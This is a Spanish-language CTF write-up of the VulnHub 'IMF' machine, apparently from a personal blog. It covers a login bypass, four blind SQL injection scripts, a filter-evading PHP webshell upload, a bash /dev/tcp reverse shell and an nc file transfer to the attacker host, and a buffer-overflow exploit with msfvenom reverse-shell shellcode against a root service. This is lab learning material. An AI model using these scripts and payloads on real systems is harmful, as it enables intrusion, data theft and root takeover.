---
layout: single
title: IMF - VulnHub
excerpt: "Este CTF destaca la importancia de asegurar las aplicaciones web contra vulnerabilidades como la carga insegura de archivos y el buffer overflow, que pueden permitir a un atacante tomar el control total de un sistema."
date: 2025-02-09
classes: wide
header:
  teaser:
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - VulnHub
tags:  
  - CTF
  - VulnHub
  - Metasploit
  - Nmap
  - Buffer Overflow
  - SQL Injection
  - Python
  - GDB
  - Ghidra
  - BurpSuite
---

## Resumen

El siguiente es un resumen de los pasos y técnicas utilizadas en la explotación de la máquina vulnerable "IMF" en VulnHub, que involucra la explotación de varias vulnerabilidades comunes en aplicaciones web y binarios locales.
### 1. Reconocimiento y Explotación de la Página Web

Se identificó que el servidor expone un único servicio web en el puerto 80. Al analizar la página web (aparentemente gubernamental), se descubrieron varias secciones y un código fuente que contenía pistas, tales como:

- La primera bandera en Base64: YWxsdGhlZmlsZXM=, que se traduce a allthefiles.
- Nombres de usuario codificados.
- Archivos .js en Base64 que, al decodificarse, revelan otra bandera y un usuario administrador: imfadministrator.

Además, se utilizó BurpSuite para interceptar y modificar las solicitudes HTTP, permitiendo manipular la autenticación y acceder al sistema.

### 2. Explotación de la Inyección SQL (SQLi)

La página de administración (CMS) es vulnerable a una inyección SQL. Se desarrolló un script en Python para automatizar el ataque y enumerar las bases de datos, tablas y columnas.

- Se encontró la base de datos admin, que contenía la tabla pages con varias columnas.
- Al filtrar los contenidos de la tabla pages, se obtuvo un valor clave que luego permitió acceder a la carga de archivos.

### 3. Subida de Archivos Maliciosos

A través de la interfaz de carga de archivos, se subió un archivo PHP con un payload que permitía ejecutar comandos remotos en el servidor.

- Se exploraron varias técnicas para evadir filtros de verificación de archivos, como la modificación de la extensión y el contenido del archivo.
- Finalmente, se consiguió cargar una webshell PHP con la capacidad de ejecutar comandos a través de una URL, logrando una conexión inversa a la máquina atacante.

### 4. Escalada de Privilegios - Buffer Overflow

El siguiente paso fue identificar un binario vulnerable (/usr/local/bin/agent) que se ejecutaba como root. A través de ingeniería inversa con Ghidra, se descubrió una vulnerabilidad de desbordamiento de buffer (Buffer Overflow) en el binario.

- El análisis mostró que el binario no validaba adecuadamente la entrada del usuario, lo que permitía sobrescribir la memoria y ejecutar código malicioso.
- Usando gdb y herramientas como pattern_create para generar un patrón de bytes, se determinó el offset de la vulnerabilidad.
- A partir de allí, se construyó un payload para explotar el desbordamiento y obtener acceso root al sistema.

### 5. Detalles Adicionales sobre el Binario Vulnerable

- Mediante checksec y la comprobación de configuraciones de seguridad, se verificó que el binario era susceptible a desbordamientos de buffer debido a la falta de protección en el entorno de ejecución.

## Reconocimiento

El servidor expone un solo servicio web en el puerto 80.

## Página web

El sitio web aparenta ser una página gubernamental.

![](/assets/images/IMF/Pasted-image-20240605120128.png)

La página tiene tres secciones: ‘Home’, ‘Projects’ y ‘Contact Us’. Al explorar la sección ‘Contact Us’ y ver el código fuente (Ctrl + U), encontramos la primera bandera:

![](/assets/images/IMF/Pasted-image-20240605120337.png)

```
'YWxsdGhlZmlsZXM=' -> allthefiles
```

En la misma página, más abajo, se encuentran posibles nombres de usuario:

![](/assets/images/IMF/Pasted-image-20240605120454.png)

```
rmichaels
akeith
estone
```

En el código fuente de cualquier página, se encuentran archivos ‘js’ codificados en base64:

![](/assets/images/IMF/Pasted-image-20240605120654.png)

Al decodificarlos obtenemos:

```
curl -s -X GET "http://192.168.3.227/index.php" | grep '\.js' | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d; echo
```

- Data:

    ```
    flag2{aW1mYWRtaW5pc3RyYXRvcg==}
    ```

![](/assets/images/IMF/Pasted-image-20240605120905.png)

Esto revela la segunda bandera:

```
'aW1mYWRtaW5pc3RyYXRvcg==' -> imfadministrator
```

Al visitar ‘imfadministrator’, se muestra una página de inicio de sesión:

![](/assets/images/IMF/Pasted-image-20240605121037.png)

Si se introduce una contraseña incorrecta pero el nombre de usuario es correcto, el sitio lo reportará:

```
Username:rmichaels
Password:test
```

![](/assets/images/IMF/Pasted-image-20240605123051.png)

Usando ‘BurpSuite’ para interceptar la petición y modificando el campo ‘pass’ con ‘[]’, se obtiene acceso:

![](/assets/images/IMF/Pasted-image-20240605123339.png)

![](/assets/images/IMF/Pasted-image-20240605123348.png)

Esto nos proporciona la tercera bandera:

```
'Y29udGludWVUT2Ntcw==' -> continueTOcms
```

Al hacer clic en el hipervínculo ‘IMF CMS’ somos llevados a:

![](/assets/images/IMF/Pasted-image-20240605123539.png)

## Inyección SQL (SQL Injection)

Esta página es vulnerable a inyección SQL (SQLI), por lo que desarrollamos un script en Python para enumerar las bases de datos y automatizar el proceso:

```
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def ctrl_c(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
characters = string.ascii_lowercase + "_," + string.digits
main_url = "http://192.168.3.227/imfadministrator/cms.php?pagename="

def sqli():

    header = {
        'Cookie': 'PHPSESSID=a7rq935a1b6pmjphdgnkhn5kh2'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyección SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=header)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyección SQL finalizado exitosamente")
    p2.success(data)

if __name__ == '__main__':

    sqli()
```

- Data:

    ![](/assets/images/IMF/Pasted-image-20240605131100.png)

La base de datos de interés es ‘admin’. A continuación, otro script en Python para enumerar las tablas:

```
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def ctrl_c(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
characters = string.ascii_lowercase + "_," + string.digits
main_url = "http://192.168.3.227/imfadministrator/cms.php?pagename="

def sqli():

    header = {
        'Cookie': 'PHPSESSID=a7rq935a1b6pmjphdgnkhn5kh2'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyección SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(table_name) from information_schema.tables where table_schema='admin'),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=header)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyección SQL finalizado exitosamente")
    p2.success(data)

if __name__ == '__main__':

    sqli()
```

- Data:

    ![](/assets/images/IMF/Pasted-image-20240605131354.png)

A continuación, se enumeran las columnas:

```
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def ctrl_c(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
characters = string.ascii_lowercase + "_," + string.digits
main_url = "http://192.168.3.227/imfadministrator/cms.php?pagename="

def sqli():

    header = {
        'Cookie': 'PHPSESSID=a7rq935a1b6pmjphdgnkhn5kh2'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyección SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(column_name) from information_schema.columns where table_schema='admin' and table_name='pages'),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=header)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyección SQL finalizado exitosamente")
    p2.success(data)

if __name__ == '__main__':

    sqli()
```

- Data:

    ![](/assets/images/IMF/Pasted-image-20240605131631.png)

Finalmente, se enumera el contenido de la columna:

```
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def ctrl_c(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
characters = string.ascii_lowercase + "&_-:," + string.digits
main_url = "http://192.168.3.227/imfadministrator/cms.php?pagename="

def sqli():

    header = {
        'Cookie': 'PHPSESSID=a7rq935a1b6pmjphdgnkhn5kh2'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyección SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 500):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=header)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyección SQL finalizado exitosamente")
    p2.success(data)

if __name__ == '__main__':

    sqli()
```

- Data:

    ![](/assets/images/IMF/Pasted-image-20240605132224.png)

Nos interesa el valor 'tutorials-incomplete' de la columna, así que nos dirigimos a esa entrada:

## Explotación de subida de archivos

![](/assets/images/IMF/Pasted-image-20240605132435.png)

Se nos proporciona un código QR, al cual le tomamos una captura utilizando la herramienta ‘Flameshot’. Luego, guardamos la imagen y accedemos a una página web para decodificarlo ([QR-Code-Decoder](https://freewebtoolkit.com/qr-code-decoder)):

![](/assets/images/IMF/Pasted-image-20240605133249.png)

- Data:

    ```
    'dXBsb2Fkcjk0Mi5waHA=' -> uploadr942.php
    ```

Regresamos a la página de la máquina y añadimos ‘uploadr942.php’ a la URL:

![](/assets/images/IMF/Pasted-image-20240605133427.png)

Ahora debemos subir un archivo. Voy a intentar cargar un archivo ‘php’ con el siguiente contenido:

```
<?php
	system($_GET['cmd']);
?>
```

![](/assets/images/IMF/Pasted-image-20240605134245.png)

Vamos a agregar lo siguiente al archivo para verificar si está comprobando los ‘magic numbers’:

```
GIF8;
<?php
	system($_GET['cmd']);
?>
```

Como la respuesta es similar, voy a interceptar la solicitud con 'BurpSuite' para determinar si se está verificando el tipo de contenido.

![](/assets/images/IMF/Pasted-image-20240605135131.png)

Tampoco, si intento cambiar el nombre del archivo a ‘cmd.gif’, la respuesta será la siguiente:

![](/assets/images/IMF/Pasted-image-20240605135030.png)

Parece que la palabra ‘system’ no es aceptada. Voy a reemplazarla por lo siguiente:

![](/assets/images/IMF/Pasted-image-20240605135326.png)

También es válido en formato hexadecimal:

![](/assets/images/IMF/Pasted-image-20240605140640.png)

En el código fuente, se proporciona información sobre la ubicación del archivo que hemos subido:

![](/assets/images/IMF/Pasted-image-20240605135717.png)

Si ahora navegamos a la URL y añadimos ‘uploads’ seguido de la cadena y la extensión, podremos acceder a nuestro archivo:

![](/assets/images/IMF/Pasted-image-20240605140724.png)

Ahora, iniciamos una escucha en nuestro sistema y ejecutamos una shell con el siguiente comando: bash -c "bash -i >%26 /dev/tcp/192.168.3.5/443 0>%261". Esto nos proporcionará acceso al servidor:

![](/assets/images/IMF/Pasted-image-20240605140747.png)

## Buffer Overflow

Si listamos los archivos en el directorio actual, encontraremos la quinta bandera:

```
'YWdlbnRzZXJ2aWNlcw==' -> agentservices
```

Vamos a buscar el término ‘agent’ para ver qué encontramos.

```
find / -name agent 2>/dev/null
	/usr/local/bin/agent
	/etc/xinetd.d/agent
```

Se ha encontrado un binario y un archivo de texto. Si leemos el contenido del archivo de texto, encontramos lo siguiente:

```
cat /etc/xinetd.d/agent
# default: on
# description: The agent server serves agent sessions
# unencrypted agentid for authentication.
service agent
{
       flags          = REUSE
       socket_type    = stream
       wait           = no
       user           = root
       server         = /usr/local/bin/agent
       log_on_failure += USERID
       disable        = no
       port           = 7788
}
```

Vamos a ejecutar el binario:

![](/assets/images/IMF/Pasted-image-20240605172613.png)

Necesitamos un 'ID', por lo que utilizaremos una herramienta llamada [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases) para analizar cómo está programado el binario antes de compilarlo. Primero, transferiremos el binario a nuestra máquina local:

```
# Máquina víctima
nc 192.168.3.5 443 < /usr/local/bin/agent
# Máquina local
nc -nlvp 443 > agent
```

![](/assets/images/IMF/Pasted-image-20240605173234.png)

Ahora, con la herramienta ‘Ghidra’, creamos un nuevo proyecto, importamos el binario y lo arrastramos al icono del dragón verde:

![](/assets/images/IMF/Pasted-image-20240605173638.png)

Le indicas que sí realice el análisis.

![](/assets/images/IMF/Pasted-image-20240605173717.png)

Vamos a la sección ‘Functions’.

![](/assets/images/IMF/Pasted-image-20240605173814.png)

Y accedemos a la función denominada ‘main’.

![](/assets/images/IMF/Pasted-image-20240605173907.png)

Si observamos, la variable local_22 parece ser nuestro input cuando se solicita el ‘ID’ al ejecutar el binario.

![](/assets/images/IMF/Pasted-image-20240605174318.png)

Si posicionamos el cursor sobre la variable local_22 y presionamos la tecla ‘l’, podremos cambiar su nombre en todo el código de la función main.

![](/assets/images/IMF/Pasted-image-20240605174451.png)

También podemos concluir que la variable pcVar1 representa el agentID de nuestro input, por lo que la renombraremos como agentID_userInput.

Si examinamos esta comparación:

![](/assets/images/IMF/Pasted-image-20240605174910.png)

Podemos observar que la variable iVar2 está utilizando strncmp para comparar dos variables: una es nuestro input y la otra es una variable llamada local_28. Si buscamos más arriba en el código, veremos que local_28 tiene el valor 0x2ddd984:

![](/assets/images/IMF/Pasted-image-20240605175400.png)

Pero el valor está en hexadecimal. Si posicionamos el cursor sobre él y hacemos clic derecho, podemos cambiarlo a formato decimal.

![](/assets/images/IMF/Pasted-image-20240605175320.png)

- Data:

    ```
    48093572
    ```

Si tomamos ese número y lo usamos como identificador cuando el binario nos pida el ‘ID’, debería funcionar como el identificador correcto:

![](/assets/images/IMF/Pasted-image-20240605175550.png)

Y efectivamente, ahora tenemos varias opciones. Si vamos a ‘Ghidra’, podemos explorar los menús disponibles para analizar más a fondo el binario.

![](/assets/images/IMF/Pasted-image-20240605175948.png)

- 1.- extractionpoints:
	- No es vulnerable.

- 2.- requestextraction:
	- No es vulnerable.

- 3.- report:
	- Es vulnerable:
		
		![](/assets/images/IMF/Pasted-image-20240605185020.png)
		
		No está validando el tamaño del buffer.
		
		![](/assets/images/IMF/Pasted-image-20240605185316.png)
		
		Vemos que es vulnerable a un desbordamiento de buffer (Buffer Overflow).

Regresamos a nuestra máquina y abrimos la herramienta ‘gdb-peda’ con el binario:

```
gdb ./agent -q
```

Y creamos un patrón de 200 caracteres:

```
pattern create 200
```

Hacemos que el binario crashee:

```
EAX: 0xffffcfa4 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASA\244\317\377\377TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0xf7e1cff4 --> 0x21cd8c 
ECX: 0xf7e1e9b8 --> 0x0 
EDX: 0x1 
ESI: 0x8048970 (<__libc_csu_init>:	push   ebp)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41417241 ('ArAA')
ESP: 0xffffd050 ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x74414156 ('VAAt')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x74414156
[------------------------------------stack-------------------------------------]
0000| 0xffffd050 ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffd054 ("AuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffd058 ("XAAvAAYAAwAAZAAxAAyA")
0012| 0xffffd05c ("AAYAAwAAZAAxAAyA")
0016| 0xffffd060 ("AwAAZAAxAAyA")
0020| 0xffffd064 ("ZAAxAAyA")
0024| 0xffffd068 ("AAyA")
0028| 0xffffd06c --> 0xa000000 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x74414156 in ?? ()
```

Obtenemos el valor de ‘EIP’ y, con el siguiente comando:

```
pattern offset 0x74414156
1950433622 found at offset: 168
```

El offset se encuentra en ‘168’.

Ahora vamos a revisar las medidas de seguridad del binario:

```
checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

Vamos al terminal de la máquina víctima y verificamos si el ‘ASLR’ (Address Space Layout Randomization) está activado.

```
cat /proc/sys/kernel/randomize_va_space
2
```

Si está activado, para verificarlo:

```
ldd /usr/local/bin/agent
	linux-gate.so.1 =>  (0xf7776000)
	libc.so.6 => /lib32/libc.so.6 (0xf75b7000)
	/lib/ld-linux.so.2 (0x56590000)

ldd /usr/local/bin/agent
	linux-gate.so.1 =>  (0xf77b6000)
	libc.so.6 => /lib32/libc.so.6 (0xf75f7000)
	/lib/ld-linux.so.2 (0x565bb000)
```

Vamos a utilizar la herramienta ‘msfvenom’ para generar un ‘shellcode’ que nos permita establecer una 'reverse shell':

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.3.5 LPORT=443 -b '\x00\x0a\x0d' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xdb\xd1\xb8\x50\xfd\x96\x28\xd9\x74\x24\xf4\x5b\x2b\xc9"
"\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x13\xee\x74\xdd\xa2"
"\xcb\x8e\xfd\x97\xa8\x23\x68\x15\xa6\x25\xdc\x7f\x75\x25"
"\x8e\x26\x35\x19\x7c\x58\x7c\x1f\x87\x30\xbf\x77\x74\xc5"
"\x57\x8a\x7b\xc4\x1c\x03\x9a\x76\x04\x44\x0c\x25\x7a\x67"
"\x27\x28\xb1\xe8\x65\xc2\x24\xc6\xfa\x7a\xd1\x37\xd2\x18"
"\x48\xc1\xcf\x8e\xd9\x58\xee\x9e\xd5\x97\x71";
```

Vamos a determinar la dirección del registro 'EAX' utilizando el 'OP-code':

```
❯ objdump -d agent | grep -i "FF D0"
 8048563:	ff d0                	call   *%eax
```

Ahora vamos a crear un exploit en Python con el siguiente contenido:

```
#!/usr/bin/python3

from struct import pack
import socket *

shellcode = (b"\xdb\xd1\xb8\x50\xfd\x96\x28\xd9\x74\x24\xf4\x5b\x2b\xc9"
b"\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x13\xee\x74\xdd\xa2"
b"\xcb\x8e\xfd\x97\xa8\x23\x68\x15\xa6\x25\xdc\x7f\x75\x25"
b"\x8e\x26\x35\x19\x7c\x58\x7c\x1f\x87\x30\xbf\x77\x74\xc5"
b"\x57\x8a\x7b\xc4\x1c\x03\x9a\x76\x04\x44\x0c\x25\x7a\x67"
b"\x27\x28\xb1\xe8\x65\xc2\x24\xc6\xfa\x7a\xd1\x37\xd2\x18"
b"\x48\xc1\xcf\x8e\xd9\x58\xee\x9e\xd5\x97\x71")

offset = 168

# ❯ objdump -d agent | grep -i "FF D0"
#  8048563:	ff d0                	call   *%eax

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))
s.recv(1024)
s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1024)
s.send(payload)
```

Ejecutamos el exploit, y con ello obtendremos acceso como usuario privilegiado (ROOT). La sexta bandera se encuentra en el directorio '/root'.

```
'R2gwc3RQcm90MGMwbHM=' -> Gh0stProt0c0ls
```

### Conclusión

El exploit en el CTF "IMF" utilizó una combinación de vulnerabilidades típicas en aplicaciones web (inyección SQL y subida de archivos) y una vulnerabilidad en un binario local (buffer overflow) para obtener acceso total al sistema y escalar privilegios. Las herramientas empleadas incluyeron BurpSuite, Ghidra, Python para la automatización, y técnicas clásicas de explotación de binarios con gdb.
